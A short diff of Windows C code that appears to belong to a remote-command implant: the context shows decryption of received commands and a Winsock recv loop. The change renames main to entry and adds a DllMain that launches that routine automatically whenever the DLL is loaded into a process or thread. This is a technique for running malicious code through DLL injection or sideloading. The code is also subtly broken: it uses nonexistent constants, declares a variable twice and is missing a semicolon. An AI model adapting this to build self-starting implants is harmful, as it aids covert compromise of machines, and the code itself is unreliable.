@@ -159,7 +159,7 @@ char* decryptfunction(char* command){
 	return plaintextcmd
 }
 
-int main() {
+int entry() {
 
 	WSADATA wsaData;
 	int iResult;
@@ -246,6 +246,28 @@ int main() {
 		else
 			printf("recv failed: %d\n", WSAGetLastError());
 	} while (iResult > 0);
+}
 
+BOOL APIENTRY DllMain(
+   HANDLE hModule,	   
+   DWORD ul_reason_for_call, 
+   LPVOID lpReserved )     
+{
+   switch ( ul_reason_for_call )
+   {
+	   case DLL_PROCESS_ATTACHED:
+	   int retval = entry();
+	   break;
 
+	case DLL_THREAD_ATTACHED:
+	  	int retval = entry();
+		break;
+
+	case DLL_THREAD_DETACH:
+		break;
+
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
 }
